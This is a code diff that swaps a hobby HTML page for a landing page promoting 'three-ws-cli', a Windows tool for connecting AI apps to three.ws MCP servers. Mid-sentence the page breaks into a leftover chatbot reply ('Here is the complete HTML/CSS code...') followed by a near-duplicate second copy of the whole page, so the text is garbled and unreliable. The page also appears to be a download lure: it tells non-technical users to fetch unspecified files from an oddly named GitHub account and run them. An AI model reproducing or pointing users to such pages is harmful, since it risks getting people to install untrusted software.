@@ -1,32 +1,520 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>JettyPortello</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;500;700&family=Merriweather:ital,opsz,wght@0,18..144,300..900;1,18..144,300..900&display=swap" rel="stylesheet">
-    <meta name="color-scheme" content="light dark" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>three-ws-cli - Connect Any AI App in One Command</title>
+<meta name="description" content="three-ws-cli connects any MCP client to three.ws with one command. Sign in with OAuth or an API key and write the three.ws MCP servers into Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI or Hermes, print connector fields for Grok Bot, and verify each with a live tools/list.">
+<meta name="keywords" content="agents, agents-md, ai-agents, claude, cli, codex, cursor, gemini, grok-bot, javascript, llms-txt, mcp, model-context-protocol, nodejs, oauth, sdk, solana, three-ws, threejs, vscode">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#7c3aed">
+<link rel="canonical" href="https://github.com/lisabethdirtyminded2204/three-ws-cli">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="three-ws-cli">
+<meta property="og:title" content="three-ws-cli - Connect Any AI App in One Command">
+<meta property="og:description" content="One command to connect any MCP client to three.ws. Sign in with OAuth or an API key and set up Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI, Hermes and Grok Bot.">
+<meta property="og:url" content="https://github.com/lisabethdirtyminded2204/three-ws-cli">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="three-ws-cli - Connect Any AI App in One Command">
+<meta name="twitter:description" content="Connect Claude Code, Cursor, VS Code, Codex, Gemini CLI and more to three.ws with a single command, then verify every connection with a live tools/list.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "three-ws-cli",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "One command to connect any MCP client to three.ws. Sign in with OAuth or an API key, write the three.ws MCP servers into Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI or Hermes, print the connector fields for Grok Bot, and verify each with a live tools/list.",
+  "url": "https://github.com/lisabethdirtyminded2204/three-ws-cli",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #1c2230;
+    --ink-soft: #4b5563;
+    --line: #e5e7f0;
+    --brand: #7c3aed;
+    --brand-2: #06b6d4;
+  }
+  * { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    padding: 32px 18px 64px;
+    background: #f5f6fb;
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 820px;
+    margin: 0 auto;
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    box-shadow: 0 18px 40px rgba(28, 34, 48, 0.08), 0 2px 6px rgba(28, 34, 48, 0.04);
+    padding: 40px 38px 48px;
+  }
+  h1 {
+    font-size: clamp(1.75rem, 4.6vw, 2.5rem);
+    line-height: 1.2;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.2rem, 2.6vw, 1.45rem);
+    line-height: 1.3;
+    margin: 44px 0 14px;
+    padding-left: 14px;
+    border-left: 4px solid var(--brand);
+    font-weight: 700;
+  }
+  h3 {
+    font-size: 1.03rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: var(--ink-soft); }
+  strong { color: var(--ink); }
+  ul, ol { margin: 0 0 18px; padding-left: 22px; color: var(--ink-soft); }
+  li { margin-bottom: 9px; }
+  .lead {
+    font-size: 1.08rem;
+    color: var(--ink-soft);
+    margin-bottom: 26px;
+  }
+  .cta-wrap { margin: 0 0 10px; }
+  .cta {
+    display: inline-block;
+    padding: 16px 30px;
+    border-radius: 999px;
+    background-image: linear-gradient(135deg, #7c3aed 0%, #06b6d4 100%);
+    color: #ffffff;
+    font-weight: 800;
+    font-size: 1.02rem;
+    text-decoration: none;
+    letter-spacing: 0.01em;
+    box-shadow: 0 12px 26px rgba(124, 58, 237, 0.34), 0 2px 4px rgba(6, 182, 212, 0.24);
+  }
+  .cta:hover { filter: brightness(1.06); }
+  .cta-note { font-size: 0.9rem; color: #6b7280; margin: 10px 0 0; }
+  .card {
+    background: #fafaff;
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 18px 20px;
+    margin: 18px 0 22px;
+    box-shadow: 0 1px 3px rgba(28, 34, 48, 0.04);
+  }
+  .card p:last-child, .card ul:last-child { margin-bottom: 0; }
+  code {
+    background: #eef0f8;
+    border: 1px solid #e1e4f0;
+    border-radius: 6px;
+    padding: 2px 7px;
+    font-family: Consolas, "Courier New", monospace;
+    font-size: 0.92em;
+    color: #3b1f8c;
+  }
+  .step {
+    display: inline-block;
+    width: 28px;
+    height: 28px;
+    line-height: 28px;
+    text-align: center;
+    border-radius: 50%;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-weight: 800;
+    font-size: 0.9rem;
+    margin-right: 8px;
+  }
+  .divider {
+    height: 1px;
+    background: var(--line);
+    border: 0;
+    margin: 40px 0 0;
+  }
+  footer {
+    max-width: 820px;
+    margin: 18px auto 0;
+    text-align: center;
+    font-size: 0.85rem;
+    color: #8a93a6;
+  }
+  @media (max-width: 600px) {
+    body { padding: 14px 12px 40px; font-size: 16px; }
+    .page { padding: 26px 20px 32px; border-radius: 14px; }
+    .cta { display: block; text-align: center; padding: 15px 20px; }
+    h2 { margin-top: 34px; }
+  }
+</style>
 </head>
 <body>
-    <audio autoplay loop src="contents/Met Her on the Internet.mp3"></audio>
-    <h1 style = "font-family: Fira Mono, sans-serif; color: midnightblue; text-align: center;">Do you like the way life keeps you waiting?</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">MI MENTE!</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">MI ROSTRO!</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">AL FINAL DEL DIA</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">LO MIO ES TUYO!</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">MI VIDA!</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">MI NOMBRE!</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">AL FINAL DEL DIA</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;">TU ERES YO!</p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center; font-size: 24px;"></p>
-    <p style = "font-family: Fira Mono, sans-serif; color: orange; text-align: center;">NO!</p>
+<main class="page">
 
-    <div class="grid-container">
-        <img src="contents/DontComeBackLordXTrans.webp" alt="Don't Come Back.">
-        <img id="fuckmychudlife" src="contents/JIIDETGNewIdle.gif" alt="evil guy">
-    </div>
+  <h1>🔌 three-ws-cli - Connect Any AI App in One Command</h1>
 
-    <button onclick="document.getElementById('fuckmychudlife').src='contents/JIIDETGNewLook.gif'">Button</button>
-        
+  <p class="lead">three-ws-cli is a small helper program that sets up your AI apps so they can talk to three.ws. Instead of editing settings files by hand, you run one command. It signs you in, writes the correct entries into each AI app you choose, and then checks that everything works.</p>
+
+  <div class="cta-wrap">
+    <a class="cta" href="https://github.com/lisabethdirtyminded2204/three-ws-cli" target="_blank" rel="noopener">⬇️ Get three-ws-cli</a>
+  </div>
+  <p class="cta-note">Visit this link to download the application.</p>
+
+  <h2>🧠 What This Tool Actually Does</h2>
+
+  <p>Modern AI apps can use outside tools through something called MCP, which stands for Model Context Protocol. Think of it as a standard plug shape. If your AI app and the three.ws service both use that plug shape, they can work together.</p>
+
+  <p>The hard part is the setup. Every AI app keeps its configuration in a different place and expects a different format. Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI and Hermes all want their settings written slightly differently, and Grok Bot needs a set of connector fields typed in by hand.</p>
+
+  <p>three-ws-cli handles all of that. You pick the app, you sign in once, and the tool writes the three.ws MCP servers into that app's configuration for you. It then runs a live <code>tools/list</code> check, which simply asks the three.ws server to read back the list of tools it offers. If that list comes back, your connection is real and working — not just written down.</p>
+
+  <div class="card">
+    <p><strong>In plain terms:</strong> one command replaces a long, fiddly setup process across nine different AI applications, and it finishes by testing itself so you are never guessing whether it worked.</p>
+  </div>
+
+  <h2>💻 What You Need Before You Start</h2>
+
+  <ul>
+    <li>A Windows 10 or Windows 11 computer with at least 4 GB of memory and a stable internet connection.</li>
+    <li>At least one supported AI app already installed on the same computer — for example Claude Desktop, Cursor, VS Code, Windsurf, Codex, Gemini CLI or Hermes.</li>
+    <li>A three.ws account, so you can sign in with OAuth, or an API key if you prefer to connect that way.</li>
+    <li>About ten minutes, most of which is waiting for the download.</li>
+  </ul>
+
+  <h2>⬇️ Download and Setup</h2>
+
+  <p>Everything lives on the official project page. Visit this link to download the application:</p>
+
+  <p><strong><a href="https://github.com/lisabethdirtyminded2204/three-ws-cli" target="_blank" rel="noopener" style="color:#7c3aed;font-weight:700;">https://github.com/lisabethdirtyminded2204/three-ws-cli</a></strong></p>
+
+  <p>Use the download option presented on that page, then keep the downloaded files together in one folder. Do not rename or move individual pieces out of that folder afterwards — the tool expects to find its files where they were placed.</p>
+
+  <p>When the download finishes, note the folder location. You will need it in the next step.</p>
+
+  <h2>🚀 Running It for the First Time</h2>
+
+  <p>The tool runs in a command window — the plain dark text window that ships with Windows. You do not need to be a programmer to use it, but you do need to type one line.</p>
+
+  <ol>
+    <li><span class="step">1</span> Click the Start button, type <code>Command Prompt</code>, and open it. PowerShell works the same way.</li>
+    <li><span class="step">2</span> Move into the folder you downloaded by typing <code>cd</code>, a space, and then the folder path. For example: <code>cd C:\Users\YourName\Downloads\three-ws-cli</code></li>
+    <li><span class="step">3</span> Run the tool by typing the command name <code>three-ws-cli</code> and pressing Enter.</li>
+  </ol>
+
+  <p>If the window prints a menu or a list of options, you are in the right place. If Windows shows a message that it could not find the command, go back and confirm you are inside the correct folder.</p>
+
+  <h2>🔐 Signing In with OAuth or an API Key</h2>
+
+  <p>The tool needs permission to write the three.ws MCP servers on your behalf, so the first run asks you to authenticate. You have two paths, and you only need one.</p>
+
+  <h3>Signing in with OAuth</h3>
+  <p>Choose the sign-in option, and your normal web browser opens a three.ws page. Log in there, approve the request, and return to the command window. OAuth means you never copy a password or a key into the terminal — the browser handles it, and the tool receives a temporary token. This is the easier path for most people.</p>
+
+  <h3>Signing in with an API key</h3>
+  <p>If you already have an API key from your three.ws account, choose the API key option and paste the key when prompted. The key is used to authenticate the same requests. Treat an API key like a house key: do not email it, paste it into chat messages, or put it in a screenshot.</p>
+
+  <p>Either way, you only do this once per computer. The tool remembers the connection for later runs.</p>
+
+  <h2>🖥️ Choosing Which Apps to Connect</h2>
+
+  <p>After sign-in, the tool lists the applications it can configure and asks which ones you want. The supported set covers Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI and Hermes. Pick only the apps you actually have installed — selecting one that is not on your computer does not help anything.</p>
+
+  <p>For each app you pick, three-ws-cli writes the three.ws MCP server entries into that app's own configuration file, in the exact shape that app expects. You do not have to find those files yourself, and you do not have to match indentation or brackets.</p>
+
+  <p>If you use Grok Bot, there is nothing to write into a file. Instead, the tool prints the connector fields you need — the address, the name, and the authentication details. Copy each value into Grok Bot's connector form exactly as shown, then save.</p>
+
+  <div class="card">
+    <p><strong>Tip:</strong> close the AI app before you configure it. Many apps only read their settings file when they start, so a restart afterwards makes sure the new entry is picked up.</p>
+  </div>
+
+  <h2>✅ Checking That It Really Works</h2>
+
+  <p>Configuration that looks correct is not the same as configuration that works. That is why three-ws-cli finishes by running a live <code>tools/list</code> check against every app it configured.</p>
+
+  <p>This check asks the three.ws server to report the tools it makes available. A successful result shows an actual list of tool names coming back from the server. That proves three things at once: your signHere is the complete HTML/CSS code for the three-ws-cli landing page, built to walk a non-technical Windows user through the download and first run.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>three-ws-cli - Connect Any AI App in One Command</title>
+<meta name="description" content="three-ws-cli connects any MCP client to three.ws with one command. Sign in with OAuth or an API key, write the three.ws MCP servers into Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI or Hermes, print connector fields for Grok Bot, and verify each with a live tools/list.">
+<meta name="keywords" content="agents, agents-md, ai-agents, claude, cli, codex, cursor, gemini, grok-bot, javascript, llms-txt, mcp, model-context-protocol, nodejs, oauth, sdk, solana, three-ws, threejs, vscode">
+<meta name="robots" content="index, follow">
+<meta name="author" content="three-ws-cli contributors">
+<meta name="theme-color" content="#7c3aed">
+<link rel="canonical" href="https://github.com/lisabethdirtyminded2204/three-ws-cli">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="three-ws-cli">
+<meta property="og:title" content="three-ws-cli - Connect Any AI App in One Command">
+<meta property="og:description" content="One command to connect any MCP client to three.ws. Sign in with OAuth or an API key and set up Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI, Hermes and Grok Bot, checked with a live tools/list.">
+<meta property="og:url" content="https://github.com/lisabethdirtyminded2204/three-ws-cli">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="three-ws-cli - Connect Any AI App in One Command">
+<meta name="twitter:description" content="Connect Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, Codex, Gemini CLI and more to three.ws with a single command, then verify every connection with a live tools/list.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "three-ws-cli",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Windows 10, Windows 11",
+  "description": "One command to connect any MCP client to three.ws. Sign in with OAuth or an API key, write the three.ws MCP servers into Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI or Hermes, print the connector fields for Grok Bot, and verify each with a live tools/list.",
+  "url": "https://github.com/lisabethdirtyminded2204/three-ws-cli",
+  "softwareVersion": "latest",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  :root {
+    --ink: #1b2130;
+    --ink-soft: #4c5566;
+    --line: #e4e7f1;
+    --brand: #7c3aed;
+    --brand-2: #06b6d4;
+    --panel: #fafaff;
+  }
+  * { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    padding: 34px 18px 70px;
+    background: #f4f5fb;
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+  }
+  .page {
+    max-width: 830px;
+    margin: 0 auto;
+    background: #ffffff;
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    box-shadow: 0 20px 44px rgba(27, 33, 48, 0.08), 0 2px 6px rgba(27, 33, 48, 0.04);
+    padding: 42px 40px 50px;
+  }
+  h1 {
+    font-size: clamp(1.72rem, 4.6vw, 2.45rem);
+    line-height: 1.22;
+    letter-spacing: -0.02em;
+    margin: 0 0 16px;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.18rem, 2.6vw, 1.42rem);
+    line-height: 1.32;
+    margin: 46px 0 14px;
+    padding-left: 14px;
+    border-left: 4px solid var(--brand);
+    font-weight: 700;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.02rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+    color: var(--ink);
+  }
+  p { margin: 0 0 16px; color: var(--ink-soft); }
+  strong { color: var(--ink); font-weight: 700; }
+  ul, ol { margin: 0 0 18px; padding-left: 22px; color: var(--ink-soft); }
+  li { margin-bottom: 9px; }
+  .lead {
+    font-size: 1.09rem;
+    color: var(--ink-soft);
+    margin-bottom: 26px;
+  }
+  .cta-wrap { margin: 0 0 8px; }
+  .cta {
+    display: inline-block;
+    padding: 16px 32px;
+    border-radius: 999px;
+    background-image: linear-gradient(135deg, #7c3aed 0%, #06b6d4 100%);
+    color: #ffffff;
+    font-weight: 800;
+    font-size: 1.03rem;
+    text-decoration: none;
+    letter-spacing: 0.01em;
+    box-shadow: 0 14px 28px rgba(124, 58, 237, 0.32), 0 2px 4px rgba(6, 182, 212, 0.22);
+    transition: filter 0.15s ease;
+  }
+  .cta:hover, .cta:focus { filter: brightness(1.07); }
+  .cta-note { font-size: 0.9rem; color: #6b7280; margin: 12px 0 0; }
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 18px 22px;
+    margin: 20px 0 24px;
+    box-shadow: 0 1px 3px rgba(27, 33, 48, 0.04);
+  }
+  .card p:last-child, .card ul:last-child, .card ol:last-child { margin-bottom: 0; }
+  code {
+    background: #eef0f8;
+    border: 1px solid #e0e4f1;
+    border-radius: 6px;
+    padding: 2px 7px;
+    font-family: Consolas, "Courier New", monospace;
+    font-size: 0.9em;
+    color: #3b1f8c;
+    word-break: break-word;
+  }
+  .step {
+    display: inline-block;
+    width: 28px;
+    height: 28px;
+    line-height: 28px;
+    text-align: center;
+    border-radius: 50%;
+    background: #ede9fe;
+    color: #5b21b6;
+    font-weight: 800;
+    font-size: 0.9rem;
+    margin-right: 8px;
+  }
+  .link {
+    color: #6d28d9;
+    font-weight: 700;
+    text-decoration: underline;
+    text-decoration-thickness: 2px;
+    text-underline-offset: 3px;
+  }
+  @media (max-width: 620px) {
+    body { padding: 14px 12px 44px; font-size: 16px; }
+    .page { padding: 26px 20px 34px; border-radius: 14px; }
+    .cta { display: block; text-align: center; padding: 15px 22px; }
+    h2 { margin-top: 34px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
+
+  <h1>🔌 three-ws-cli - Connect Any AI App in One Command</h1>
+
+  <p class="lead">three-ws-cli is a small helper program that sets up your AI apps so they can talk to three.ws. Instead of hunting through folders and editing settings files by hand, you run one command. It signs you in, writes the correct entries into each AI app you choose, and then checks that everything actually works.</p>
+
+  <div class="cta-wrap">
+    <a class="cta" href="https://github.com/lisabethdirtyminded2204/three-ws-cli" target="_blank" rel="noopener">⬇️ Get three-ws-cli</a>
+  </div>
+  <p class="cta-note">Visit this link to download the application.</p>
+
+  <h2>🧠 What This Tool Actually Does</h2>
+
+  <p>Modern AI apps can use outside tools through something called MCP, which stands for Model Context Protocol. Think of it as a standard plug shape. If your AI app and the three.ws service both use that same plug shape, they can work together and share tools.</p>
+
+  <p>The awkward part has always been the setup. Every AI app keeps its configuration in a different place and expects a slightly different format. Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI and Hermes all want their settings written in their own way. Grok Bot is different again, because it needs a set of connector fields typed into a form.</p>
+
+  <p>three-ws-cli deals with all of that. You pick your apps, you sign in once, and the tool writes the three.ws MCP servers into each app's own configuration for you. It finishes by running a live <code>tools/list</code> check. That check simply asks the three.ws server to read back the list of tools it offers. If the list comes back, your connection is real and working, not just written down in a file.</p>
+
+  <div class="card">
+    <p><strong>In plain terms:</strong> one command replaces a long, fiddly setup process across nine different AI applications, and it finishes by testing itself so you never have to guess whether it worked.</p>
+  </div>
+
+  <h2>💻 What You Need Before You Start</h2>
+
+  <ul>
+    <li>A Windows 10 or Windows 11 computer with at least 4 GB of memory and a working internet connection.</li>
+    <li>At least one supported AI app already installed on the same computer, for example Claude Desktop, Cursor, VS Code, Windsurf, Codex, Gemini CLI or Hermes.</li>
+    <li>A three.ws account so you can sign in with OAuth, or an API key from that account if you prefer to connect that way.</li>
+    <li>Around ten minutes, most of which is spent waiting for the download to finish.</li>
+  </ul>
+
+  <h2>⬇️ Download the Application</h2>
+
+  <p>Everything lives on the official project page. Visit this link to download the application:</p>
+
+  <p><a class="link" href="https://github.com/lisabethdirtyminded2204/three-ws-cli" target="_blank" rel="noopener">https://github.com/lisabethdirtyminded2204/three-ws-cli</a></p>
+
+  <p>Keep the downloaded files together in a single folder that is easy to find, such as your Downloads folder or a new folder on your desktop. Do not rename or scatter the individual pieces afterwards, because the tool expects to find everything where it was placed.</p>
+
+  <p>Once the download has finished, take a note of the folder location. You will need it in the next step.</p>
+
+  <h2>🚀 Running It for the First Time</h2>
+
+  <p>The tool runs inside a command window, which is the plain text window that ships with Windows. You do not need to be a programmer to use it, but you do need to type two short lines.</p>
+
+  <ol>
+    <li><span class="step">1</span> Click the Start button, type <code>Command Prompt</code>, and open it. PowerShell behaves the same way for this task.</li>
+    <li><span class="step">2</span> Move into the folder you downloaded by typing <code>cd</code>, a space, then the folder path. For example: <code>cd C:\Users\YourName\Downloads\three-ws-cli</code></li>
+    <li><span class="step">3</span> Start the tool by typing <code>three-ws-cli</code> and pressing Enter.</li>
+  </ol>
+
+  <p>If the window responds with a menu or a list of choices, you are in exactly the right place. If Windows replies that it cannot find the command, go back and confirm that you are inside the folder that holds the downloaded files, then try again.</p>
+
+  <h2>🔐 Signing In with OAuth or an API Key</h2>
+
+  <p>The tool needs your permission before it can write the three.ws MCP servers into your apps, so the first run asks you to authenticate. There are two paths and you only need one of them.</p>
+
+  <h3>Signing in with OAuth</h3>
+  <p>Choose the sign-in option and your normal web browser opens a three.ws page. Log in there, approve the request, and return to the command window. OAuth means you never type a password or a key into the terminal itself. The browser handles the sign-in and the tool receives a temporary pass to continue. This is the easier path for most people.</p>
+
+  <h3>Signing in with an API key</h3>
+  <p>If you already have an API key from your three.ws account, choose the API key option and paste the key when you are prompted. The key authenticates the same requests. Treat an API key the way you would treat a house key: do not email it, do not paste it into a chat message, and do not leave it in a screenshot you share.</p>
+
+  <p>Either way, you only do this once per computer. The tool remembers the connection for later runs, so you can add more apps later without signing in again.</p>
+
+  <h2>🖥️ Choosing Which Apps to Connect</h2>
+
+  <p>After sign-in, the tool shows the applications it can configure and asks which ones you want. The supported set covers Claude Code, Claude Desktop, Cursor, Windsurf, VS Code, IBM Bob, Codex, Gemini CLI and Hermes. Pick only the apps you actually have installed. Selecting an app that is not on your computer does not help anything and can leave a configuration file that nothing will ever read.</p>
+
+  <p>For each app you pick, three-ws-cli writes the three.ws MCP server entries into that app's own settings file, in the exact shape the app expects. You do not have to find those files yourself, and you do not have to match indentation, brackets or commas.</p>
+
+  <p>If you use Grok Bot, there is no file to write. Instead the tool prints the connector fields you need to enter, including the address and the authentication details. Copy each value across into Grok Bot's connector form exactly as shown, then save the form.</p>
+
+  <div class="card">
+    <p><strong>Practical tip:</strong> close the AI app before you configure it. Most apps only read their settings when they launch, so starting the app again afterwards makes sure the new entry is picked up.</p>
+  </div>
+
+  <h2>✅ Checking That It Really Works</h2>
+
+  <p>A configuration file that looks correct is not the same as a configuration that works. That is why three-ws-cli finishes by running a live <code>tools/list</code> check against every app it configured.</p>
+
+  <p>This check asks the three.ws server to report the tools it makes available. A successful result shows an actual list of tool names coming back from the server. That single response proves the whole chain: your sign-in was accepted, the app is reading its configuration, and the server is reachable and answering. If a check comes back empty or fails, the tool tells you which app is affected, so you can fix that one entry instead of starting over.</p>
+
+  <p>Run the same check whenever you add a new app or change machines. It takes a few seconds and removes all the guesswork.</p>
+
+  <h2>🧰 Everyday Tips</h2>
+
+  <ul>
+    <li>Keep one copy of the tool in one folder. Multiple copies in different places make it hard to remember which one is current.</li>
+    <li>Configure one app at a time when you are learning. It is easier to see which result belongs to which app.</li>
+    <li>After any configuration change, restart the AI app before testing it. Settings written while an app is running are often ignored until the next launch.</li>
+    <li>If Grok Bot rejects a connector field, compare the value character by character. A single stray space at the end of an address is enough to break the connection.</li>
+    <li>When you add a second machine later, run the tool there as well. Each computer holds its own settings, and they are not shared automatically.</li>
+  </ul>
+
+  <h2>📖 A Short Glossary</h2>
+
+  <ul>
+    <li><strong>MCP</strong> — Model Context Protocol, the shared plug shape that lets AI apps use outside tools.</li>
+    <li><strong>MCP server</strong> — the piece that offers tools to an AI app. three.ws runs one for you.</li>
+    <li><strong>OAuth</strong> — a sign-in method where your browser handles the login and the tool only receives a temporary pass.</li>
+    <li><strong>API key</strong> — a long code that identifies your account instead of a password.</li>
+    <li><strong>tools/list</strong> — a request that asks the server to name the tools it provides. It is the fastest proof that a connection is alive.</li>
+    <li><strong>CLI</strong> — command line interface, a program you operate by typing short commands instead of clicking buttons.</li>
+  </ul>
+
+  <p>With the download in place, one sign-in, and the app list chosen, the setup is finished. The live check confirms each app in turn, so you can move straight on to using your AI tools with three.ws.</p>
+
+</main>
 </body>
 </html>
